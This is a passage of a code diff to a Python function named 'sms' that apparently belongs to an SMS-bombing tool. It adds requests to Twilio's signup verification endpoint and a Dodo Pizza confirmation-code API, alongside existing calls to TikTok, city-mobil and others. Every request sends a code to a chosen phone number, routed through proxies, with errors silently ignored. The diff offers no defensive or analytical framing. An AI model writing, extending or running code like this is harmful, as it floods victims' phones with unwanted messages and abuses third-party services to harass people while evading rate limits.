@@ -86,6 +86,16 @@ def sms(prx, number, tm):
 
 				try:
 				    payload = {
+				        "CountryCodeNumber": "+" + number[1:], 
+				        "IsoCountryCode": "RU", 
+				        "PhoneNumber": f"+{number}"
+				    }
+				    requests.post("https://www.twilio.com/signup/v2/phone-number/verification/sms", json=payload, proxies = proxies)
+				except:
+				    pass
+
+				try:
+				    payload = {
 				        "landing": "loyalty",
 				        "phone": "79110385633"
 				    }
@@ -187,6 +197,14 @@ def sms(prx, number, tm):
 					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": number, "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header, proxies=proxies)
 				except:
 					pass
+
+				try:
+				    payload = {
+				        "phoneNumber": f"+{number}"
+				    }
+				    requests.post("https://dodopizza.kz/api/sendconfirmationcode", json = payload, proxies = proxies)
+				except:
+				    pass
 
 				try:
 					requests.get(f"https://findclone.ru/register?phone=+{number}", proxies = proxies)
@@ -311,6 +329,24 @@ def sms(prx, number, tm):
 				        "phone": "79110385633"
 				    }
 				    requests.post("https://hemingoway.city-mobil.ru/api/v1/send_link", json=payload)
+				except:
+				    pass
+
+				try:
+				    payload = {
+				        "CountryCodeNumber": "+" + number[1:], 
+				        "IsoCountryCode": "RU", 
+				        "PhoneNumber": f"+{number}"
+				    }
+				    requests.post("https://www.twilio.com/signup/v2/phone-number/verification/sms", json=payload)
+				except:
+				    pass
+
+				try:
+				    payload = {
+				        "phoneNumber": f"+{number}"
+				    }
+				    requests.post("https://dodopizza.kz/api/sendconfirmationcode", json = payload)
 				except:
 				    pass
 
